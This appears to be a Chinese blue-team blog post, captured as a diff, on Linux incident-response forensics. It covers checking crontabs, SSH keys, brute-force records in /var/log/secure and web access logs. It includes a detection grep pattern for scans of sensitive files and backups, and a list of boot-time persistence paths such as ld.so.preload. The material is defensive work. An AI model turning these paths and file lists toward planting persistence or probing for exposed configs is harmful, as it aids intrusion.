+<h3 id="主机服务分析"><a href="#主机服务分析" class="headerlink" title="主机服务分析"></a>主机服务分析</h3><p>枚举主机所有服务，查看是否有恶意服务。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service --status-all</span><br><span class="line">chkconfig –list        #列出所有的系统服务</span><br></pre></td></tr></table></figure>
+
+<h3 id="定时任务分析"><a href="#定时任务分析" class="headerlink" title="定时任务分析"></a>定时任务分析</h3><p>定时任务对于玩CTF和做渗透的师傅应该都不陌生</p>
+<p>查看单个用户的定时任务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
+
+<p>循环遍历所有用户的定时任务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for u in &#96;cat &#x2F;etc&#x2F;passwd | cut -d&quot;:&quot; -f1&#96;;do crontab -l -u $u;done</span><br></pre></td></tr></table></figure>
+
+<p>anacron异步定时任务查看</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;anacrontab</span><br></pre></td></tr></table></figure>
+
+<p>除此之外，以下目录中也可能存在恶意脚本，需进一步排查。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;crontab</span><br><span class="line">&#x2F;etc&#x2F;cron.d&#x2F;*</span><br><span class="line">&#x2F;etc&#x2F;cron.daily&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;cron.hourly&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;cron.monthly&#x2F;*</span><br><span class="line">&#x2F;etc&#x2F;cron.weekly&#x2F;</span><br><span class="line">&#x2F;etc&#x2F;anacrontab</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;anacron&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看CPU运行"><a href="#查看CPU运行" class="headerlink" title="查看CPU运行"></a>查看CPU运行</h3><p>定位挖矿时很实用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure>
+
+<h3 id="ssh秘钥分析"><a href="#ssh秘钥分析" class="headerlink" title="ssh秘钥分析"></a>ssh秘钥分析</h3><p>redis未授权访问漏洞可直接向服务器写入公钥，从而实现无密码登录服务器，之前也写过类似的<a target="_blank" rel="noopener" href="https://blog.m1kh.com/index.php/archives/35/">文章</a>，所以要重点关注/etc/.ssh、 ~/.ssh 目录下有无可疑公钥</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ll -al &#x2F;etc&#x2F;ssh&#x2F;</span><br><span class="line">ll -al &#x2F;root&#x2F;.ssh&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>查看日志是查找攻击源最好的方法，虽然耗时长；linux日志默认存放位置：/var/log/</p>
+<p>查看日志配置情况：more /etc/rsyslog.conf</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">日志文件</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">/var/log/cron</td>
+<td align="left">记录了系统定时任务相关的日志</td>
+</tr>
+<tr>
+<td align="left">/var/log/cups</td>
+<td align="left">记录打印信息的日志</td>
+</tr>
+<tr>
+<td align="left">/var/log/dmesg</td>
+<td align="left">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
+</tr>
+<tr>
+<td align="left">/var/log/mailog</td>
+<td align="left">记录邮件信息</td>
+</tr>
+<tr>
+<td align="left">/var/log/message</td>
+<td align="left">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
+</tr>
+<tr>
+<td align="left">/var/log/btmp</td>
+<td align="left">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
+</tr>
+<tr>
+<td align="left">/var/log/lastlog</td>
+<td align="left">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
+</tr>
+<tr>
+<td align="left">/var/log/wtmp</td>
+<td align="left">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
+</tr>
+<tr>
+<td align="left">/var/log/utmp</td>
+<td align="left">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
+</tr>
+<tr>
+<td align="left">/var/log/secure</td>
+<td align="left">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
+</tr>
+</tbody></table>
+<h3 id="主机日志分析"><a href="#主机日志分析" class="headerlink" title="主机日志分析"></a>主机日志分析</h3><p>查看登录失败信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -o &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|uniq -c</span><br></pre></td></tr></table></figure>
+
+<p>输出登录爆破的第一行和最后一行，确认爆破时间范围</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|head -1 </span><br><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|tail -1</span><br></pre></td></tr></table></figure>
+
+<p>查看有哪些IP在爆破root帐号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>
+
+<p>输出有爆破行为的IP</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>输出被爆破的用户名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</span><br></pre></td></tr></table></figure>
+
+<p>查看登录成功的日期、用户名、IP</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>查看哪些IP登录成功了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>
+
+<h3 id="web日志分析"><a href="#web日志分析" class="headerlink" title="web日志分析"></a>web日志分析</h3><p>先统计请求ip，方便后续分析（取出日志可用sz命令或者xftp）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;&#123;print $1&#125;&#39; blog.m1kh.com.log | sort | uniq -c | sort -rn | more</span><br><span class="line">awk &#39;&#123;print $1&#125;&#39; blog.m1kh.com.log | sort | uniq -c | sort -rn &gt;</span><br></pre></td></tr></table></figure>
+
+<p>统计下日志有多少行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wc -l blog.m1kh.com.log					#-l统计行数</span><br><span class="line">cat -n blog.m1kh.com.log | tail -1</span><br></pre></td></tr></table></figure>
+
+<p>状态码统计</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat blog.m1kh.com.log  |awk &#39;&#123;print $9&#125;&#39;|sort|uniq -c|sort -rn</span><br></pre></td></tr></table></figure>
+
+<p>URL 统计（200）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &quot;183.6.56.66&quot; blog.m1kh.com.log |  awk &#39;&#123;if ($9&#x3D;&#x3D;200) print $1,$7,$9&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>查看并统计200的状态码及ip（去重后）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat blog.m1kh.com.log  | awk &#39;&#123;if ($9&#x3D;200) print $1,$7,$9&#125;&#39;|sort|uniq -c|sort -rn | head -20</span><br></pre></td></tr></table></figure>
+
+<p>有时候遇到目录扫描会产生大量日志，这时候我们可以分开看，可用awk进行分割，只看状态码为200的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">more blog.m1kh.com.log | egrep &quot;\.zip|\.rar|\.mdb|\.inc|\.sql|\.config|\.bak|&#x2F;login.inc.php|&#x2F;.svn&#x2F;|&#x2F;mysql&#x2F;|config.inc.php|\.bak|wwwroot|网站备份|&#x2F;gf_admin&#x2F;|&#x2F;DataBackup&#x2F;|&#x2F;Web.config|&#x2F;web.config|&#x2F;1.txt|&#x2F;test.txt|www.zip|www.tar&quot; &gt; test.log</span><br><span class="line">[root@m1kh wwwlogs]# more test.log | awk &#39;&#123;if($9&#x3D;&#x3D;200) &#123;print $1,$2,$3,$4,$6,$7,$8,$9&#125;&#125;&#39;</span><br><span class="line">183.6.56.66 - - [12&#x2F;Apr&#x2F;2021:18:14:44 &quot;GET &#x2F;config.inc.php HTTP&#x2F;2.0&quot; 200</span><br><span class="line">183.6.56.66 - - [12&#x2F;Apr&#x2F;2021:18:14:45 &quot;GET &#x2F;config.inc.php HTTP&#x2F;2.0&quot; 200</span><br></pre></td></tr></table></figure>
+
+<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><p><strong>开机启动的一些路径</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc</span><br><span class="line">&#x2F;etc&#x2F;rc</span><br><span class="line">&#x2F;etc&#x2F;rc.local</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc.local</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc</span><br><span class="line">&#x2F;etc&#x2F;rc$runlevel.d&#x2F; 该目录下都是链接的可执行文件，也可以自己添加可执行程序</span><br><span class="line">&#x2F;etc&#x2F;ld.so.cache   </span><br><span class="line">&#x2F;etc&#x2F;ld.so.preload </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;libioset.so</span><br><span class="line">&#x2F;etc&#x2F;init.d</span><br><span class="line">另外一个添加启动项的地方在  &#x2F;etc&#x2F;profile里面，还有  &#x2F;etc&#x2F;profile.d&#x2F;目录下以sh结尾的文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="grep指令"><a href="#grep指令" class="headerlink" title="grep指令"></a>grep指令</h2><p>2、grep 查找含有某字符串的所有文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -rn &quot;hello,world!&quot; </span><br><span class="line">* : 表示当前目录所有文件，也可以是某个文件名</span><br><span class="line">-r 是递归查找</span><br><span class="line">-n 是显示行号</span><br><span class="line">-R 查找所有文件包含子目录</span><br><span class="line">-i 忽略大小写</span><br></pre></td></tr></table></figure>
+
+<p>4、find /etc -name init</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;在目录&#x2F;etc中查找文件init</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A、&#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">2、登录成功的IP有哪些：     </span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name&#x3D;kali, GID&#x3D;1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name&#x3D;kali, UID&#x3D;1001, GID&#x3D;1001, home&#x3D;&#x2F;home&#x2F;kali</span><br><span class="line">, shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; &#x2F;var&#x2F;log&#x2F;secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line"># grep &quot;userdel&quot; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid&#x3D;0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY&#x3D;pts&#x2F;4 ; PWD&#x3D;&#x2F;home&#x2F;good ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;sbin&#x2F;shutdown -r now</span><br></pre></td></tr></table></figure>
+
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">vague huang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/12/03/蓝队日志溯源/">http://example.com/2021/12/03/蓝队日志溯源/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/12/08/2021nu1lctf/"><i class="fa fa-chevron-left">  </i><span>2021nu1lctf</span></a></div><div class="next-post pull-right"><a href="/2021/11/29/2021i%E6%98%A5%E7%A7%8B%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/"><span>2021i春秋秋季个人赛</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>
